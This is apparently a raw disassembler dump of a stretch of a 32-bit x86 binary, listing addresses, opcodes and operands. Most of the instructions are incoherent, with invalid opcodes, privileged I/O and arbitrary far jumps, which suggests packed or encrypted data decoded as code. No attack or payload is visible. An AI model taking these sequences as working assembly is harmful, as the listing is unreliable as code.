  416b6a:	xor    eax,0x6400f423
  416b6f:	test   BYTE PTR [eax-0x1e],ah
  416b72:	int3   
  416b73:	loopne 0x416bbc
  416b75:	and    al,0x8b
  416b78:	xor    ecx,esi
  416b7a:	aas    
  416b7b:	fidivr DWORD PTR [eax+0x1ee5f07f]
  416b81:	inc    eax
  416b82:	push   esp
  416b83:	ret    0xc30d
  416b86:	add    BYTE PTR [esi+0x3b],ch
  416b89:	xor    eax,0xc1e71e61
  416b8e:	or     ecx,ebp
  416b90:	xor    DWORD PTR [edi+ebx*4],esi
  416b93:	add    BYTE PTR [esi],0x48
  416b96:	mov    eax,0xcc038dd6
  416b9b:	cmp    BYTE PTR ds:0xda313aa,cl
  416ba1:	aas    
  416ba2:	push   ebx
  416ba3:	jp     0x416bb5
  416ba5:	sub    DWORD PTR [ebp-0x4450fd54],esi
  416bab:	add    al,0x2a
  416bad:	gs scas al,BYTE PTR es:[edi]
  416baf:	(bad)  
  416bb0:	mov    ?,WORD PTR [edi-0x20]
  416bb3:	ret    
  416bb4:	pop    edx
  416bb5:	jmp    0xc2f1d81c
  416bba:	add    eax,0xc8a3209a
  416bbf:	push   cs
  416bc0:	mov    dl,0xbc
  416bc2:	aad    0x89
  416bc4:	mov    al,ds:0x7f2349c9
  416bc9:	mov    esi,fs
  416bcb:	leave  
  416bcc:	aaa    
  416bcd:	and    BYTE PTR ds:0xbb664c88,dh
  416bd3:	scas   al,BYTE PTR es:[edi]
  416bd4:	mov    eax,0x4e8cce9
  416bd9:	ret    
  416bda:	fdiv   DWORD PTR [eax]
  416bdc:	test   al,0xf
  416bde:	sub    dh,BYTE PTR [ebp-0x74e8650d]
  416be4:	test   eax,0xe678dcb8
  416be9:	xor    DWORD PTR [esi+0xed34e5d],esi
  416bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf0:	lock xchg ebx,eax
  416bf2:	daa    
  416bf3:	jnp    0x416c2c
  416bf5:	cmp    BYTE PTR [edx],ah
  416bf7:	imul   ebp,DWORD PTR [esp+eax*2-0x5f],0x85883d59
  416bff:	inc    esp
  416c00:	shl    dh,1
  416c02:	xchg   esi,eax
  416c03:	sbb    esp,DWORD PTR [ebp-0x39a9af4]
  416c09:	test   eax,0x541189ba
  416c0e:	inc    ebx
  416c0f:	sub    eax,0x9973c2e7
  416c14:	pop    ebp
  416c15:	cmp    edi,esp
  416c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c18:	loop   0x416c4e
  416c1a:	mov    dh,0x92
  416c1c:	dec    ax
  416c1e:	imul   BYTE PTR [ecx]
  416c20:	aaa    
  416c21:	cwde   
  416c22:	xchg   ecx,eax
  416c23:	cld    
  416c24:	jp     0x416c3d
  416c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c27:	repnz rcl dh,cl
  416c2a:	xchg   bl,cl
  416c2c:	push   cs
  416c2d:	call   0xc2f2:0x584bcedf
  416c34:	imul   ebp,ebp,0xd20dd5
  416c3a:	dec    edx
  416c3b:	stc    
  416c3c:	sub    BYTE PTR [ebp-0xc0034d2],al
  416c42:	pop    esp
  416c43:	push   eax
  416c44:	jecxz  0x416bec
  416c46:	leave  
  416c47:	xchg   esi,eax
  416c48:	in     eax,0xff
  416c4a:	out    0xf7,al
  416c4c:	cmp    BYTE PTR [edx-0x66],bh
  416c4f:	jmp    0x64a0:0x73bd7cf0
  416c56:	sar    BYTE PTR [ecx],cl
  416c58:	es jno 0x416cca
  416c5b:	or     bh,BYTE PTR [ecx]
  416c5d:	push   cs
  416c5e:	cdq    
  416c5f:	fucomp st(3)
  416c61:	jae    0x416ccb
  416c63:	jg     0x416c3c
  416c65:	dec    edi
  416c66:	in     al,0x7c
  416c68:	or     DWORD PTR [edi],edi
  416c6a:	push   eax
  416c6b:	lds    esi,FWORD PTR [ebp-0xdb97c54]
  416c71:	inc    esi
  416c72:	xchg   ecx,eax
  416c73:	lods   eax,DWORD PTR ds:[esi]
  416c74:	sub    al,0xfc
  416c76:	test   BYTE PTR [ebx+0x36],al
  416c79:	out    dx,al
  416c7a:	pop    ds
  416c7b:	and    dh,BYTE PTR [esi+0x5c]
  416c7e:	fidiv  WORD PTR [ebx+0x78]
  416c81:	scas   eax,DWORD PTR es:[edi]
  416c82:	and    al,0x67
  416c84:	or     eax,0x152f63c8
  416c89:	aad    0xd5
  416c8b:	jp     0x416ccb
  416c8d:	add    esp,DWORD PTR [edx+edi*4-0x57]
  416c91:	mov    dl,0xd9
  416c93:	sub    al,0x34
  416c95:	or     BYTE PTR [ecx],0xcd
  416c98:	leave  
  416c99:	movhlps xmm2,xmm1
  416c9c:	jae    0x416c70
  416c9e:	outs   dx,BYTE PTR ds:[esi]
  416c9f:	shr    BYTE PTR [ebp-0x75],cl
  416ca2:	xchg   ecx,eax
  416ca3:	mov    dh,0x42
  416ca5:	(bad)  
  416ca6:	mov    esi,0x4b1f0ee2
  416cab:	retf   0x5b80
  416cae:	pop    es
  416caf:	lar    edx,WORD PTR [edx+edx*1-0x78d1e4c0]
  416cb7:	dec    esi
  416cb8:	scas   eax,DWORD PTR es:[edi]
  416cb9:	dec    edi
  416cba:	daa    
  416cbb:	or     DWORD PTR [edi+eax*1],ebx
  416cbe:	sub    al,0x31
  416cc0:	les    esi,FWORD PTR [eax+0x5c]
  416cc3:	test   al,0x8f
  416cc5:	sbb    DWORD PTR [ebx+eax*4],ecx
  416cc8:	dec    ebp
  416cc9:	xlat   BYTE PTR ds:[ebx]
  416cca:	outs   dx,BYTE PTR ds:[esi]
  416ccb:	ins    DWORD PTR es:[edi],dx
  416ccc:	xor    eax,0xbb5741e7
  416cd1:	mov    es,WORD PTR [ebx]
  416cd3:	es push ss
  416cd5:	add    DWORD PTR [ebp+0x2f150b95],0xd1199742
  416cdf:	xor    cl,BYTE PTR [esp+eiz*4]
  416ce2:	leave  
  416ce3:	xsavec [ecx]
  416ce6:	ret    
  416ce7:	inc    eax
  416ce8:	mul    ah
  416cea:	sbb    dl,BYTE PTR [edx-0x5]
  416ced:	or     DWORD PTR [ebp+0x5b52d8c6],0xffffffa5
  416cf4:	int3   
  416cf5:	xchg   BYTE PTR [eax+eax*4-0x61a39fd],cl
  416cfc:	lock jno 0x416c93
  416cff:	sbb    BYTE PTR [esi-0x2a],al
  416d02:	std    
  416d03:	ss mov ah,0x83
  416d06:	(bad)  
  416d07:	stos   DWORD PTR es:[edi],eax
  416d08:	xchg   DWORD PTR [esp+edi*2],ecx
  416d0b:	hlt    
  416d0c:	jae    0x416d57
  416d0e:	xor    BYTE PTR [edx+0x7a],ah
  416d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d12:	jo     0x416cf4
  416d14:	jne    0x416cce
  416d16:	adc    al,0x24
  416d18:	or     eax,0x52b57883
  416d1d:	or     eax,0x6fb44292
  416d22:	data16 test BYTE PTR [esi+0x4b267f7b],bl
  416d29:	cmp    ch,bl
  416d2b:	je     0x416d2a
  416d2d:	adc    BYTE PTR [esi-0x3a],dl
  416d30:	adc    DWORD PTR [ecx-0x2b25c566],0x3f
  416d37:	dec    ebx
  416d38:	pcmpeqb mm0,QWORD PTR [ecx-0x19]
  416d3c:	push   0x9263e18
  416d41:	pop    ecx
  416d42:	adc    ecx,DWORD PTR [edx-0x64626aab]
  416d48:	mov    bl,0xdc
  416d4a:	cmc    
  416d4b:	sbb    ah,BYTE PTR [ecx-0x19]
  416d4e:	imul   eax,DWORD PTR [edx],0xc5e44d8d
  416d54:	test   al,0x1a
  416d56:	sbb    eax,0x25974fb7
  416d5b:	xchg   BYTE PTR ds:0x337e434c,dl
  416d61:	mov    ch,0x4
  416d63:	jge    0x416cf1
  416d65:	or     DWORD PTR [edx+ebp*1+0x6c],eax
  416d69:	add    DWORD PTR es:[edx+0x6286721],0xffffff80
  416d71:	jge    0x416d63
  416d73:	clc    
  416d74:	mov    ch,0x26
  416d76:	fcmovb st,st(1)
  416d78:	loopne 0x416d6d
  416d7a:	mov    BYTE PTR [eax-0x5aec761b],ah
  416d80:	mov    ds:0x9da28ac1,eax
  416d85:	(bad)  
  416d86:	je     0x416ded
  416d88:	test   al,0xa0
  416d8a:	add    al,0x46
  416d8c:	call   0x7ee:0x1b6eac96
  416d93:	xor    BYTE PTR [ebx+ebx*8+0x73],al
  416d97:	sahf   
  416d98:	lahf   
  416d99:	clc    
  416d9a:	xlat   BYTE PTR ds:[ebx]
  416d9b:	xchg   esi,eax
  416d9c:	and    al,0x11
  416d9e:	retf   
  416d9f:	cmp    DWORD PTR [esp+eax*1],edx
  416da2:	int3   
  416da3:	out    0x47,al
  416da5:	jne    0x416db0
  416da7:	fsubp  st(4),st
  416da9:	les    ecx,FWORD PTR [ebx]
  416dab:	pop    ebp
  416dac:	dec    edx
  416dad:	sbb    cl,BYTE PTR [esp+esi*2-0x54]
  416db1:	mov    ds:0xa8e0097f,eax
  416db6:	rol    ah,1
  416db8:	xlat   BYTE PTR ds:[ebx]
  416db9:	mov    esp,0x2d0045c2
  416dbe:	lahf   
  416dbf:	dec    ebx
  416dc0:	push   esi
  416dc1:	xchg   cx,ax
  416dc3:	inc    ebx
  416dc4:	ret    0x1480
  416dc7:	mov    cl,0x4
  416dc9:	stos   DWORD PTR es:[edi],eax
  416dca:	mov    DWORD PTR es:[eax],eax
  416dcd:	dec    eax
  416dce:	cmp    edi,0xdfb080a4
  416dd4:	pop    ss
  416dd5:	into   
  416dd6:	in     al,dx
  416dd7:	inc    edi
  416dd8:	push   cs
  416dd9:	test   edi,ebx
  416ddb:	rcl    BYTE PTR [edx+0x31],0x50
  416ddf:	push   edi
  416de0:	jns    0x416dea
  416de2:	cmp    al,0xda
  416de4:	fwait
  416de5:	lahf   
  416de6:	fadd   QWORD PTR [ecx]
  416de8:	icebp  
  416de9:	mov    ebp,0x987f2a7f
  416dee:	inc    edx
  416def:	inc    esp
  416df0:	fcom   QWORD PTR [edi+0x7db30d99]
  416df6:	push   cs
  416df7:	dec    ebx
  416df8:	outs   dx,BYTE PTR ds:[esi]
  416df9:	inc    edi
  416dfa:	mov    ds:0xf677aaa2,al
  416dff:	gs mov dl,0x1
  416e02:	mov    edi,0xf542f596
  416e07:	fist   WORD PTR [edx+eax*2+0xe]
  416e0b:	jmp    0xa823:0xb75af969
  416e12:	xlat   BYTE PTR ds:[ebx]
  416e13:	scas   al,BYTE PTR es:[edi]
  416e14:	loopne 0x416e18
  416e16:	pop    ds
  416e17:	xor    al,0xc3
  416e19:	push   ebp
  416e1a:	sub    esp,edi
  416e1c:	in     al,dx
  416e1d:	xchg   DWORD PTR [ebx-0x48158aa9],ebx
  416e23:	gs xor eax,0x712e8721
  416e29:	mov    ah,0x64
  416e2b:	cmp    edi,DWORD PTR [esi]
  416e2d:	inc    edi
  416e2e:	adc    ah,bl
  416e30:	inc    ecx
  416e31:	adc    eax,0x875b74cc
  416e36:	inc    edx
  416e37:	loope  0x416e55
  416e39:	adc    esp,esi
  416e3b:	pop    ebp
  416e3c:	cdq    
  416e3d:	jbe    0x416dc9
  416e3f:	inc    esp
  416e40:	mov    edx,0x106d6427
  416e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e46:	hlt    
  416e47:	pop    esp
  416e48:	rcl    edx,cl
  416e4a:	mov    esi,0x1ee96687
  416e4f:	je     0x416ebf
  416e51:	cmp    esi,DWORD PTR [edx]
  416e53:	xchg   esp,eax
  416e54:	sbb    ecx,DWORD PTR [esi]
  416e56:	inc    eax
  416e57:	add    al,0x11
  416e59:	xchg   edi,eax
  416e5a:	in     eax,0x57
  416e5c:	aaa    
  416e5d:	xchg   edi,eax
  416e5e:	push   cs
  416e5f:	lds    esp,FWORD PTR [edx]
  416e61:	xor    al,0xed
  416e63:	call   0xf937654c
  416e68:	cmp    eax,edi
  416e6a:	fimul  DWORD PTR ds:0x4bdd8a8b
  416e70:	test   DWORD PTR [edx+esi*8-0x247b2949],edx
  416e77:	and    eax,0x10cde280
  416e7c:	cmp    al,0x92
  416e7e:	mov    eax,0x76f594d9
  416e83:	loop   0x416e05
  416e85:	aaa    
  416e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e87:	push   es
  416e88:	mov    edi,0x62cb9441
  416e8d:	push   edx
  416e8e:	shl    BYTE PTR [ebx],0x47
  416e91:	mov    ebx,0xfa79816d
  416e96:	jno    0x416e92
  416e98:	adc    al,0xdc
  416e9b:	dec    eax
  416e9c:	sti    
  416e9d:	daa    
  416e9e:	jp     0x416ecb
  416ea0:	lock push edx
  416ea2:	lods   al,BYTE PTR ds:[esi]
  416ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ea5:	adc    BYTE PTR [edx],dl
  416ea7:	shr    BYTE PTR [ebp-0x5f548937],0x86
  416eae:	inc    edx
  416eaf:	inc    DWORD PTR ds:0x8ed6a67f
  416eb5:	enter  0x88b4,0xd4
  416eb9:	mov    al,0x4c
  416ebb:	push   ebx
  416ebc:	inc    eax
  416ebd:	mov    ebx,0x80d0b5a1
  416ec2:	iret   
  416ec3:	out    dx,al
  416ec4:	arpl   WORD PTR [edx+eiz*8+0x259f121f],sp
  416ecb:	push   0xffffff94
  416ecd:	cdq    
  416ece:	pushf  
  416ecf:	lahf   
  416ed0:	jle    0x416e74
  416ed2:	addr16 mov bh,0xd1
  416ed5:	push   DWORD PTR [ebp+edx*4+0x56]
  416ed9:	mov    dl,BYTE PTR [esi]
  416edb:	push   es
  416edc:	lock pop esp
  416ede:	test   al,0xbe
  416ee0:	cmc    
  416ee1:	aas    
  416ee2:	mov    cl,0xc6
  416ee4:	jecxz  0x416efb
  416ee6:	xor    edi,DWORD PTR [ecx]
  416ee8:	mov    dl,0x37
  416eea:	jmp    0xca43:0x452ef17f
  416ef1:	adc    DWORD PTR [eax],esp
  416ef3:	(bad)  
  416ef4:	(bad)  
  416ef5:	ins    BYTE PTR es:[edi],dx
  416ef6:	std    
  416ef7:	add    esi,0x22
  416efa:	nop
  416efb:	pop    edi
  416efc:	bound  bx,DWORD PTR [eax+0x46b70672]
  416f03:	mov    bh,0x7e
  416f05:	push   ebx
  416f06:	fsubr  QWORD PTR [ebx-0x7e]
  416f09:	and    al,0x85
  416f0b:	fsubr  DWORD PTR [edi]
  416f0d:	fsubrp st(0),st
  416f0f:	shrd   edx,ebx,0x77
  416f13:	sub    esp,edi
  416f15:	pop    ecx
  416f16:	or     eax,0xa368cfc4
  416f1b:	rol    BYTE PTR [esi-0x77],0xa4
  416f1f:	stos   DWORD PTR es:[edi],eax
  416f20:	mov    BYTE PTR [eax],ch
  416f22:	mov    al,0x12
  416f24:	outs   dx,DWORD PTR ds:[esi]
  416f25:	(bad)  
  416f27:	dec    edx
  416f28:	jmp    0x3fb:0x799f0596
  416f2f:	lock xor edi,esp
  416f32:	out    dx,eax
  416f33:	and    ecx,DWORD PTR [ecx-0x692e4ca4]
  416f39:	dec    edx
  416f3a:	dec    ebp
  416f3b:	dec    ebx
  416f3c:	xor    eax,0x26754bde
  416f41:	pop    ebx
  416f42:	mov    ecx,DWORD PTR [eax+ebx*1]
  416f45:	jae    0x416f39
  416f47:	fsubr  QWORD PTR ds:0x5a80cff2
  416f4d:	adc    al,0x3f
  416f4f:	ret    0xd884
  416f52:	jbe    0x416fca
  416f54:	pop    ebp
  416f55:	or     bh,0x34
  416f58:	imul   ecx,DWORD PTR [eax+ebx*8-0x1e546394],0x9789ac85
  416f63:	pusha  
  416f64:	(bad)  
  416f65:	in     al,0x3c
  416f67:	mov    DWORD PTR [esi+0x7dcba04f],edi
  416f6d:	push   0xffffffbc
  416f6f:	ins    BYTE PTR es:[edi],dx
  416f70:	adc    eax,0x7fde06d5
  416f75:	loop   0x416f28
  416f77:	dec    esp
  416f78:	mov    eax,ds:0xe5b5ae0e
  416f7d:	pop    esp
  416f7e:	lods   eax,DWORD PTR ds:[esi]
  416f7f:	push   eax
  416f80:	pop    ebx
  416f81:	push   edi
  416f82:	mov    ds:0x9c2208c0,eax
  416f87:	shr    BYTE PTR [ebx-0x5a],0xe4
  416f8b:	lock sub ebp,DWORD PTR [ecx]
  416f8e:	aad    0x9f
  416f90:	clc    
  416f91:	xchg   ebp,eax
  416f92:	dec    edi
  416f93:	lods   al,BYTE PTR ds:[esi]
  416f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f96:	int3   
  416f97:	and    dh,cl
  416f99:	xchg   ebx,eax
  416f9a:	jae    0x417005
  416f9c:	pop    edi
  416f9d:	fist   WORD PTR [esp+ebx*2]
  416fa0:	jbe    0x416f4a
  416fa2:	and    edi,ecx
  416fa4:	fld    DWORD PTR [ecx+0x4998a778]
  416faa:	loopne 0x416f42
  416fac:	mov    eax,ds:0x54e6340b
  416fb1:	ret    0x525c
  416fb4:	adc    DWORD PTR [edx+ebp*2-0x35],esi
  416fb8:	add    dl,cl
  416fba:	lahf   
  416fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fbc:	jl     0x41702b
  416fbe:	cwde   
  416fbf:	int3   
  416fc0:	sub    DWORD PTR [edi+eiz*8+0x2d1eae31],ebx
  416fc7:	cs mov ebx,0x6f4ac3d7
  416fcd:	loop   0x416f76
  416fcf:	je     0x416fa6
  416fd1:	outs   dx,BYTE PTR ds:[esi]
  416fd2:	sti    
  416fd3:	(bad)
  416fd6:	push   cs
  416fd7:	mov    al,0xa4
  416fd9:	jl     0x416f64
  416fdb:	das    
  416fdc:	adc    DWORD PTR [edi+0x35243c65],eax
  416fe2:	or     bl,BYTE PTR [edi+0x54]
  416fe5:	popa   
  416fe6:	adc    ebp,DWORD PTR [edi]
  416fe8:	sbb    BYTE PTR ds:0x87b33b72,dh
  416fee:	jg     0x416f9c
  416ff0:	mov    cl,0x72
  416ff2:	dec    esi
  416ff3:	xchg   ebp,eax
  416ff4:	mov    bl,bh
  416ff6:	cs jae 0x416fa6
  416ff9:	mov    bl,0xff
  416ffb:	sar    DWORD PTR [ecx+0x25],cl
  416ffe:	push   edi
  416fff:	shr    BYTE PTR [edx],0x97
  417002:	lods   al,BYTE PTR ds:[esi]
  417003:	push   ebp
  417004:	mov    ah,0x62
  417006:	ficom  WORD PTR [edx+0x3baf63e9]
  41700c:	mov    eax,ds:0xc4cb0295
  417011:	push   0xa320d83a
  417016:	aaa    
  417017:	shl    BYTE PTR [eax+0x3e],1
  41701a:	call   0x2080:0xa4713104
  417021:	ins    DWORD PTR es:[edi],dx
  417022:	push   0x26b090bf
  417027:	repnz push ss
  417029:	add    BYTE PTR [edx+0x4b7902bf],dl
  41702f:	push   es
  417030:	mov    edi,0x9348ea16
  417035:	cdq    
  417036:	sbb    DWORD PTR [ecx],0x51a58f5f
  41703c:	sbb    BYTE PTR [ecx+esi*1],al
  41703f:	data16 aad 0x89
  417042:	enter  0xb547,0x32
  417046:	or     edx,ecx
  417048:	enter  0x435e,0x53
  41704c:	jmp    0x85e2:0xa28cb0f3
  417053:	cmp    DWORD PTR [ebx],esi
  417055:	rcr    DWORD PTR [edi-0x6],cl
  417058:	(bad)  
  417059:	repnz aas 
  41705b:	push   ebp
  41705c:	dec    ebp
  41705d:	popf   
  41705e:	pop    ss
  41705f:	adc    bh,BYTE PTR [edi]
  417061:	lods   eax,DWORD PTR ds:[esi]
  417062:	xchg   BYTE PTR [ebx+0x38e627bc],dl
  417068:	in     al,0x5
  41706a:	js     0x417098
  41706c:	pop    ebx
  41706d:	jae    0x416ff3
  41706f:	pusha  
  417070:	sar    DWORD PTR [edx+eiz*1],1
  417073:	cs dec esi
  417075:	test   BYTE PTR ds:0xf5e3ffd6,dh
  41707b:	pop    es
  41707c:	sbb    eax,eax
  41707e:	mov    ch,0x22
  417080:	aas    
  417081:	jmp    0xbfd0:0x650a2e94
  417088:	and    al,0xf1
  41708a:	sub    eax,0x1468ad64
  41708f:	jne    0x4170f8
  417091:	scas   al,BYTE PTR es:[edi]
  417092:	int    0xba
  417094:	mov    eax,ds:0xf8460eac
  417099:	loop   0x417024
  41709b:	pop    ds
  41709c:	dec    esp
  41709d:	and    BYTE PTR [ebx+0x43660aa],bl
  4170a3:	jg     0x41703f
  4170a5:	push   ecx
  4170a6:	lea    eax,[esi+0x4dba0f9d]
  4170ac:	ds cld 
  4170ae:	es es fwait
  4170b1:	xchg   edi,eax
  4170b2:	int    0x58
  4170b4:	and    BYTE PTR [ebx+ebp*8-0x6a9938b5],bh
  4170bb:	push   esp
  4170bc:	loop   0x41710c
  4170be:	jo     0x417080
  4170c0:	jbe    0x417086
  4170c2:	loope  0x417132
  4170c4:	add    al,0x68
  4170c6:	bound  edi,QWORD PTR [ecx]
  4170c8:	sub    BYTE PTR [esp+eax*2+0x392028c5],0x6a
  4170d0:	aad    0x12
  4170d2:	outs   dx,BYTE PTR ds:[esi]
  4170d3:	mov    esp,0x48d34c1b
  4170d8:	addr16 fsubr st(5),st
  4170db:	ins    BYTE PTR es:[edi],dx
  4170dc:	push   0x51d0713b
  4170e1:	dec    edx
  4170e2:	xchg   BYTE PTR [edx+0x2b],bl
  4170e5:	mov    ah,0x67
  4170e7:	adc    bh,BYTE PTR [ecx-0x20b05ac3]
  4170ed:	ja     0x4170dc
  4170ef:	add    DWORD PTR [esp+esi*8-0x25304f7e],esi
  4170f6:	fist   WORD PTR [ebx+edi*8-0x43]
  4170fa:	inc    edx
  4170fb:	popa   
  4170fc:	pop    ebp
  4170fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170fe:	xor    al,0xee
  417100:	xchg   ecx,eax
  417101:	in     eax,0x1a
  417103:	retf   0xa870
  417106:	les    ebx,FWORD PTR [edx+0x61]
  417109:	pop    ebp
  41710a:	and    al,0x1e
  41710c:	mov    DWORD PTR [esi-0x29d3f10e],ebp
  417112:	and    DWORD PTR [esi-0x2c06426f],edi
  417118:	sbb    eax,0x2167fa53
  41711d:	push   ss
  41711e:	imul   esp,DWORD PTR ds:0xdf8a1149,0x28e5be42
  417128:	cli    
  417129:	mov    eax,0x18c1ca2c
  41712e:	repz clc 
  417130:	jb     0x417171
  417132:	not    DWORD PTR [ecx-0x24]
  417135:	mov    dl,0x4c
  417137:	inc    esi
  417138:	xlat   BYTE PTR ds:[ebx]
  417139:	adc    DWORD PTR [ecx],0x93b5068b
  41713f:	and    eax,0xed4bc9ac
  417144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417145:	and    BYTE PTR [ecx-0x19],ch
  417148:	ins    BYTE PTR es:[edi],dx
  417149:	cmp    BYTE PTR [esp+ecx*4],dh
  41714c:	(bad)  
  41714e:	push   0xdbf59e9
  417153:	jae    0x4171a8
  417155:	mov    ecx,0x4d0075ea
  41715a:	fist   DWORD PTR [eax+edx*1]
  41715d:	out    dx,al
  41715e:	xor    dh,ah
  417160:	dec    edi
  417161:	data16 int3 
  417163:	cmc    
  417164:	shr    BYTE PTR [esi+0x518f806f],1
  41716a:	xchg   edx,eax
  41716b:	stos   BYTE PTR es:[edi],al
  41716c:	or     BYTE PTR [esi],dh
  41716e:	jae    0x417199
  417170:	sbb    DWORD PTR [ecx+eax*1],esp
  417173:	mov    WORD PTR ds:0xf1a6e6d5,cs
  417179:	mov    al,0x6d
  41717b:	mov    ds:0x6a5fbe31,eax
  417180:	and    al,BYTE PTR [ebx]
  417182:	out    dx,eax
  417183:	inc    esp
  417184:	jmp    0xfe430672
  417189:	push   ebx
  41718a:	jl     0x4171cd
  41718c:	test   DWORD PTR [ecx],esp
  41718e:	xchg   ecx,eax
  41718f:	and    al,0x70
  417191:	and    al,BYTE PTR [esi]
  417193:	or     al,0xf1
  417195:	sub    cl,BYTE PTR [ebx]
  417197:	jb     0x417143
  417199:	push   eax
  41719a:	imul   BYTE PTR [edi+0x72db9a7c]
  4171a0:	cmp    al,0x65
  4171a2:	push   ebp
  4171a3:	int3   
  4171a4:	mov    ?,edi
  4171a6:	push   ebx
  4171a7:	cmp    cl,ah
  4171a9:	sti    
  4171aa:	pop    edx
  4171ab:	mov    edi,0x7cba0494
  4171b0:	pop    esp
  4171b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b2:	test   BYTE PTR [ebp+0x5d],al
  4171b5:	jb     0x4171ae
  4171b7:	fldl2e 
  4171b9:	dec    ebx
  4171ba:	inc    edi
  4171bb:	std    
  4171bc:	fist   WORD PTR [eax-0x3d8e2746]
  4171c2:	mov    cl,0x8c
  4171c4:	(bad)  
  4171c5:	clc    
  4171c6:	es sti 
  4171c8:	pop    edx
  4171c9:	push   esp
  4171ca:	mov    DWORD PTR [ecx],esp
  4171cc:	out    0x51,eax
  4171ce:	lds    edi,FWORD PTR [edi+0x1f8d3684]
  4171d4:	nop
  4171d5:	add    al,0x26
  4171d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171d8:	dec    ebp
  4171d9:	fucomip st,st(3)
  4171db:	popa   
  4171dc:	dec    esp
  4171dd:	ins    BYTE PTR es:[edi],dx
  4171de:	and    ebx,DWORD PTR [eax]
  4171e0:	sub    BYTE PTR [edx],cl
  4171e2:	push   es
  4171e3:	mov    ah,0xc6
  4171e5:	cdq    
  4171e6:	cmp    DWORD PTR [edi],0xfb8ce647
  4171ec:	data16 jbe 0x417225
  4171ef:	adc    eax,0xf7217ce4
  4171f4:	ds in  eax,0x85
  4171f7:	jnp    0x4171c1
  4171f9:	xchg   edx,eax
  4171fa:	ja     0x417233
  4171fc:	data16 vpaddq ymm2,ymm4,YMMWORD PTR [edi-0x4acc532f]
  417205:	leave  
  417206:	cmp    bl,BYTE PTR [ebx-0x56]
  417209:	jmp    0x6510:0xab02bdb9
  417210:	adc    BYTE PTR [edx+0x68],bh
  417213:	and    DWORD PTR [ebp+0x3906a56f],ebp
  417219:	xor    BYTE PTR [ecx],cl
  41721b:	adc    DWORD PTR [esi-0x4a4b48bc],0xffffff9a
  417222:	es ffreep st(6)
  417225:	shr    DWORD PTR [ecx],cl
  417227:	dec    edi
  417228:	mov    ecx,0x87fa35dd
  41722d:	jo     0x41722e
  41722f:	mov    edi,0x7440b3f7
  417234:	(bad)  
  417235:	push   edx
  417236:	imul   eax,DWORD PTR [esi],0x25
  417239:	stc    
  41723a:	pop    eax
  41723b:	sbb    ch,bl
  41723d:	ret    0x10b5
  417240:	push   cs
  417241:	mov    esp,0xd94afe9d
  417246:	push   edi
  417247:	xchg   edi,eax
  417248:	fwait
  417249:	jmp    0xbe6715fb
  41724e:	sbb    cl,BYTE PTR [eax+0x0]
  417251:	fldenv [eax+0x22f2db99]
  417257:	xor    al,0xdf
  417259:	neg    BYTE PTR [edx-0x5a]
  41725c:	fist   WORD PTR [ecx]
  41725e:	and    bh,BYTE PTR [ecx]
  417260:	leave  
  417261:	test   ebx,ebp
  417263:	retf   0xdfe4
  417266:	mov    eax,ds:0xa8aa07
  41726b:	fs hlt 
  41726d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41726e:	mov    ebx,ecx
  417270:	xor    BYTE PTR ds:0xa732df4b,ah
  417276:	add    al,0xa7
  417278:	cdq    
  417279:	daa    
  41727a:	lock sbb eax,0xc03d7bb7
  417280:	jnp    0x41725c
  417282:	xlat   BYTE PTR ds:[ebx]
  417283:	jno    0x4172ca
  417285:	cs js  0x41726d
  417288:	aad    0xf3
  41728a:	pop    ebx
  41728b:	lods   eax,DWORD PTR ds:[esi]
  41728c:	mov    ebx,0x856f9617
  417291:	or     BYTE PTR gs:[eax-0x7dfff274],bl
  417298:	dec    esi
  417299:	jno    0x4172ba
  41729b:	sub    al,0xd2
  41729d:	adc    esi,DWORD PTR ds:0x518c6e04
  4172a3:	sbb    esi,ebp
  4172a5:	repnz fxch st(6)
  4172a8:	jecxz  0x41728b
  4172aa:	xor    BYTE PTR [ebx],ah
  4172ac:	bound  edx,QWORD PTR [ebp+0x46]
  4172af:	pop    edi
  4172b0:	push   DWORD PTR [edi+0x3a10509]
  4172b6:	retf   0xc6bb
  4172b9:	or     esi,DWORD PTR [eax]
  4172bb:	fistp  QWORD PTR [edx+0x6a74f550]
  4172c1:	retf   
  4172c2:	and    edx,DWORD PTR [ebx]
  4172c4:	fmul   QWORD PTR [edi-0x29]
  4172c7:	jmp    0x4172d5
  4172c9:	icebp  
  4172ca:	in     eax,dx
  4172cb:	mov    al,BYTE PTR [ebx]
  4172cd:	in     eax,dx
  4172ce:	mov    WORD PTR [edx],?
  4172d0:	pop    ss
  4172d1:	jno    0x417348
  4172d3:	aas    
  4172d4:	pop    esi
  4172d5:	pop    edx
  4172d6:	ds ret 0x7365
  4172da:	mov    esi,0xff4b7894
  4172df:	das    
  4172e0:	lods   al,BYTE PTR ds:[esi]
  4172e1:	mov    ah,0x2
  4172e3:	in     eax,0x4f
  4172e5:	mov    ebp,0x56057f21
  4172ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172eb:	jnp    0x417326
  4172ed:	push   esi
  4172ee:	idiv   BYTE PTR [ebx]
  4172f0:	stc    
  4172f1:	(bad)  
  4172f2:	sahf   
  4172f3:	stos   DWORD PTR es:[edi],eax
  4172f4:	or     edx,DWORD PTR [esp+ecx*2]
  4172f7:	push   0x10
  4172f9:	dec    esp
  4172fa:	loope  0x417378
  4172fc:	or     esi,ecx
  4172fe:	mov    dl,0x44
  417300:	xchg   ecx,eax
  417301:	xor    ah,ah
  417303:	push   ecx
  417304:	enter  0xd36b,0x3f
  417308:	cld    
  417309:	sbb    DWORD PTR [eax-0x33661b1b],ecx
  41730f:	push   cs
  417310:	adc    eax,0x186d4600
  417315:	inc    ecx
  417316:	scas   eax,DWORD PTR es:[edi]
